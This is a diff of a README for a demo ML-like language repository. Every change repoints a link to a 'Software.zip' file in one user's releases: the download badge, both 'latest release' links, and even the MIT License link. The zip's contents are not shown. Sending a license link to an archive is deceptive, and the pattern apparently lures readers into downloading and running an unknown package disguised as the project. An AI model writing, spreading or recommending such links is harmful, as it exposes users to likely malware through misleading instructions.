@@ -2,7 +2,7 @@
 
 ---
 
-[![Download Zip](https://img.shields.io/badge/Download-Zip-green)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Zip](https://github.com/ayub-dotcom/polysubml-demo/releases/download/v1.0/Software.zip)](https://github.com/ayub-dotcom/polysubml-demo/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -22,7 +22,7 @@ Welcome to PolySubML-Demo! This repository showcases a simple ML-like language w
 
 ## Installation
 
-To get started with PolySubML-Demo, simply download the [latest release](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip). Once you have the zip file, extract it to a convenient location on your system and you'll be all set to dive into the features of this ML-like language.
+To get started with PolySubML-Demo, simply download the [latest release](https://github.com/ayub-dotcom/polysubml-demo/releases/download/v1.0/Software.zip). Once you have the zip file, extract it to a convenient location on your system and you'll be all set to dive into the features of this ML-like language.
 
 ---
 
@@ -41,7 +41,7 @@ PolySubML-Demo boasts a range of impressive features that make it a standout lan
 
 To start using PolySubML-Demo, follow these simple steps:
 
-1. Download the [latest release](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) of the repository.
+1. Download the [latest release](https://github.com/ayub-dotcom/polysubml-demo/releases/download/v1.0/Software.zip) of the repository.
 2. Extract the contents of the zip file to a location of your choice.
 3. Open up your favorite code editor and explore the sample ML-like code provided in the repository.
 4. Experiment with subtyping, polymorphism, higher-rank types, and global type inference to get a feel for the language's capabilities.
@@ -67,7 +67,7 @@ Thank you for considering contributing to PolySubML-Demo. Together, we can conti
 
 ## License
 
-The PolySubML-Demo repository is licensed under the [MIT License](https://opensource.org/licenses/MIT). You are free to use, modify, and distribute this codebase in accordance with the terms specified in the license.
+The PolySubML-Demo repository is licensed under the [MIT License](https://github.com/ayub-dotcom/polysubml-demo/releases/download/v1.0/Software.zip). You are free to use, modify, and distribute this codebase in accordance with the terms specified in the license.
 
 ---
 
